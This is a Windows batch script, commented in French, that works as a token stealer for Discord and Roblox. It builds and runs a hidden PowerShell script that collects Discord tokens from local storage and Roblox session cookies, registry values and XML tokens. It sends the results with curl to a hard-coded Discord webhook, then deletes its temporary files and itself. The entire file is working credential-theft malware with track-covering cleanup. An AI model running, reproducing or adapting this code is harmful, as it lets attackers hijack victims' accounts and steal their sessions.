@echo off
setlocal enabledelayedexpansion
:: PALOFSC - EXFILTRATION SIMPLIFIEE (DISCORD + ROBLOX)

set "WEBHOOK=https://discord.com/api/webhooks/1524390694376964226/1JXT_Rnb0ocyCJDBnZPuyY9qLctiKxsQe_-phkaif_Hap7ZbRugKdshY6wlYp9Jyq1T8"

:: ETAPE 1 : CREATION DU SCRIPT POWERSHELL (sans SQLite, uniquement fichiers)
set "psfile=%TEMP%\extract_robuste.ps1"
set "outfile=%TEMP%\result_robuste.txt"
(
echo # --- RECHERCHE TOKENS DISCORD ---
echo $paths = @(
echo     "$env:APPDATA\Discord\Local Storage\leveldb",
echo     "$env:APPDATA\discordptb\Local Storage\leveldb",
echo     "$env:APPDATA\discordcanary\Local Storage\leveldb"
echo )
echo $tokens = @()
echo $pattern = '[a-zA-Z0-9_\-]{20,60}\.[a-zA-Z0-9_\-]{6,20}\.[a-zA-Z0-9_\-]{20,80}'
echo foreach ($p in $paths) {
echo     if (Test-Path $p) {
echo         Get-ChildItem $p -File ^| ForEach-Object {
echo             Select-String -Path $_.FullName -Pattern $pattern -AllMatches ^| ForEach-Object { $_.Matches.Value }
echo         } ^| ForEach-Object { $tokens += $_ }
echo     }
echo }
echo $tokens = $tokens ^| Select-Object -Unique
echo $discordTokens = $tokens -join ' '
echo.
echo # --- RECHERCHE ROBLOX (REGISTRE + XML) ---
echo $robloxUser = $null
echo $robloxRemember = $null
echo $robloxToken = $null
echo try {
echo     $robloxUser = (Get-ItemProperty -Path "HKCU:\Software\Roblox\RobloxStudio" -Name "UserID" -ErrorAction SilentlyContinue).UserID
echo } catch {}
echo try {
echo     $robloxRemember = (Get-ItemProperty -Path "HKCU:\Software\Roblox\RobloxStudio" -Name "RememberMe" -ErrorAction SilentlyContinue).RememberMe
echo } catch {}
echo $xmlPath = "$env:LOCALAPPDATA\Roblox\GlobalBasicSettings_13.xml"
echo if (Test-Path $xmlPath) {
echo     try {
echo         $xml = [xml](Get-Content $xmlPath -ErrorAction SilentlyContinue)
echo         if ($xml -and $xml.settings -and $xml.settings.token) {
echo             $robloxToken = $xml.settings.token
echo         }
echo     } catch {}
echo }
echo.
echo # --- RECHERCHE COOKIE ROBLOX DANS LES FICHIERS COOKIES (FALLBACK) ---
echo $robloxCookie = $null
echo $cookiePaths = @(
echo     "$env:APPDATA\Microsoft\Windows\Cookies",
echo     "$env:LOCALAPPDATA\Microsoft\Windows\INetCookies"
echo )
echo foreach ($cp in $cookiePaths) {
echo     if (Test-Path $cp) {
echo         Get-ChildItem $cp -Filter *.txt ^| ForEach-Object {
echo             Select-String -Path $_.FullName -Pattern 'ROBLOSECURITY=[^;]+' ^| ForEach-Object { $_.Matches.Value }
echo         } ^| ForEach-Object {
echo             $val = $_ -replace 'ROBLOSECURITY=',''
echo             if ($val -match '^[a-zA-Z0-9_\-]+$') { $robloxCookie = $val }
echo         }
echo     }
echo }
echo.
echo # --- CONSTRUCTION DU MESSAGE ---
echo $msg = ""
echo if ($discordTokens -ne "") { $msg += "Tokens Discord : $discordTokens`n" }
echo if ($robloxCookie -ne $null -and $robloxCookie -ne "") { $msg += "Roblox Cookie (.ROBLOSECURITY) : $robloxCookie`n" }
echo if ($robloxUser -ne $null -and $robloxUser -ne "") { $msg += "Roblox UserID : $robloxUser`n" }
echo if ($robloxRemember -ne $null -and $robloxRemember -ne "") { $msg += "Roblox RememberMe : $robloxRemember`n" }
echo if ($robloxToken -ne $null -and $robloxToken -ne "") { $msg += "Roblox Token (XML) : $robloxToken`n" }
echo if ($msg -eq "") { $msg = "Aucune donnee collectee.`n" }
echo $msg ^| Out-File -FilePath '%outfile%' -Encoding utf8
) > "%psfile%"

:: ETAPE 2 : EXECUTION DU POWERSHELL (REDIRECTION DES ERREURS)
powershell -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%psfile%" 2>nul

:: ETAPE 3 : LECTURE DU RESULTAT
set "msg="
if exist "%outfile%" (
    for /f "usebackq delims=" %%a in ("%outfile%") do set "msg=%%a"
    del /f /q "%outfile%" >nul 2>&1
)
del /f /q "%psfile%" >nul 2>&1

:: ETAPE 4 : SI VIDE, MESSAGE PAR DEFAUT
if "!msg!"=="" set "msg=Aucune donnee collectee.\n"

:: ETAPE 5 : ECHAPPEMENT JSON
set "msg=!msg:"=\"!"
set "msg=!msg:\n=\\n!"

:: ETAPE 6 : ENVOI VIA CURL
curl -s -H "Content-Type: application/json" -d "{\"content\":\"%msg%\"}" "%WEBHOOK%" >nul 2>&1

:: ETAPE 7 : NETTOYAGE
set "msg="
del /f /q "%~f0" >nul 2>&1
exit /b 0
